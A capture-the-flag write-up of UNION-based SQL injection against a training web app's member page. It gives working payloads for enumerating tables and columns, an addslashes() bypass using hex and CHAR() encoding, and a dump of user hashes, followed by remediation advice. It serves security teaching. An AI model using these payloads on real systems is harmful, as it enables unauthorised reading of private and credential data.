# Flag — SQL Injection (Member lookup page)

**Category:** OWASP A05:2025 – Injection
**Sub-type:** SQL Injection (UNION-based)
**Location:** /?page=member
---

## 1. Discovery

The member page lets you look up a member by typing an ID. We tested the field
with a subquery instead of a plain number:

```
(SELECT user_id FROM users LIMIT 1)
```

The page returned the **same result as typing `1`**. That was the tell: our input
wasn't being treated as a simple value — the database was actually *evaluating*
what we typed (the subquery returned the first user's `user_id`, which is `1`).
That confirmed the field was injectable.

From there we assumed the backend query looked roughly like:

```sql
SELECT <col1>, <col2> FROM <table> WHERE user_id = <our input>
```

Our goal: discover the table names, then their columns, then read the data.

## 2. Finding the number of columns

UNION has one strict rule: **both halves of the UNION must return the same number
of columns**, otherwise the database refuses everything. After testing several
payloads we got this error:

```
The used SELECT statements have a different number of columns
```

That told us the original query returns **2 columns** (the ones displayed as
"First name" and "Surname").

## 3. Listing the tables

```sql
0 UNION SELECT GROUP_CONCAT(table_name), 2 FROM information_schema.tables WHERE table_schema=database()
```

How this works:

- The `0` makes the original query (`... WHERE user_id = 0`) return **nothing**,
  since no member has id 0. This leaves our injected row as the only result, so
  it lands cleanly in the displayed fields.
- `UNION` then **stacks the rows of our own SELECT** onto that empty result set.
- `GROUP_CONCAT(table_name)` is **column 1** — it flattens every table name into a
  single string so it fits in one display field.
- `2` is **filler** — a meaningless constant, only there to satisfy the
  "2 columns" rule. It could just as well be `NULL` or `'x'`.
- `table_schema=database()` restricts the results to the current application's
  schema (so we don't get MySQL's internal tables).

**Result:**

```
First name: users
Surname : 2
```

→ There is a single table, named `users`.

## 4. Listing the columns (and the `addslashes` obstacle)

The natural next query would be:

```sql
0 UNION SELECT GROUP_CONCAT(column_name), 2 FROM information_schema.columns WHERE table_name='users'
```

But it failed. The application runs `addslashes()` on our input, which turns our
`'` into `\'`. So `'users'` arrives at the database as `\'users\'`, producing a
**SQL syntax error**:

```
... right syntax to use near '\'users\' --'
```

### Workaround

Two clean ways around the escaped quotes:

- **Express the string as hex** (no quote character to escape):
  `table_name=0x7573657273` (hex for `users`), or `CHAR(117,115,101,114,115)`.
- **Avoid the string literal entirely** by filtering on the schema instead, since
  `database()` is a function (no quotes needed). This is the version we used:

```sql
0 UNION SELECT GROUP_CONCAT(table_name,0x3a,column_name), 2 FROM information_schema.columns WHERE table_schema=database()
```

(`0x3a` is just the `:` separator.)

**Result:**

```
First name: users:user_id,users:first_name,users:last_name,users:town,
            users:country,users:planet,users:Commentaire,users:countersign
Surname : 2
```

→ We now know every column of the `users` table.

## 5. Dumping the data

```sql
0 UNION SELECT GROUP_CONCAT(user_id,0x3a,Commentaire,0x3a,countersign SEPARATOR 0x0a), 2 FROM users
```

(`SEPARATOR 0x0a` puts each row on its own line — cleaner to read than the default
comma.)

**Result:**

```
1:Je pense, donc je suis:2b3366bcfd44f540e630d4dc2b9b06d9
2:Aamu on iltaa viisaampi.:60e9032c586fb422e2c16dee6286cf10
3:Dublin is a city of stories and secrets.:e083b24a01c483437bcf4a9eea7c1b4d
5:Decrypt this password -> then lower all the char. Sh256 on it and it's good !:5ff9d0165b4f92b14994e5c685cdce28
```

Row 5 spells out the next step. The `countersign` value is a **32-character
hexadecimal string**, which is the signature of an **MD5 hash** (128 bits).


The chain to get the flag:

1. Crack the MD5 `5ff9d0165b4f92b14994e5c685cdce28` (online lookup) → a word.
2. Lowercase it → `fortytwo` (as the hint says, "lower all the char").
3. SHA256 of `fortytwo`:

```
10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
```

→ **This is the flag.**

## 6. Impact

UNION-based SQL injection lets an attacker read **anything** the database account
can access: the full schema (tables, columns), and all stored data — personal
user information, credentials, comments, and any data meant to stay private. With
a more privileged DB user it can also extend to reading files on the server
(`LOAD_FILE`) or writing them (`INTO OUTFILE`), and in some setups to full system
compromise.

## 7. Remediation

**Use prepared statements (parameterized queries).** They separate the SQL code
from the data, so user input can never be interpreted as SQL. Example in PHP (PDO):

```php
$stmt = $pdo->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
$stmt->execute([$id]);
```

The `?` is a placeholder; the value of `$id` is sent separately and is always
treated as data, never as part of the query — so `0 UNION SELECT ...`, hex,
`CHAR()`, etc. all become harmless literal strings.

Additional measures:

- **Use an ORM** (Doctrine, etc.) — they use parameterized queries under the hood.
- **Do not rely on `addslashes()` / manual escaping.** As shown above, it only
  neutralizes quotes, and an attacker can express strings without any quote at all
  (hex, `CHAR()`, subqueries). It is not a real defense.
- **Apply least privilege** to the database account (no `FILE` privilege, read-only
  where possible) to limit the blast radius if an injection is found.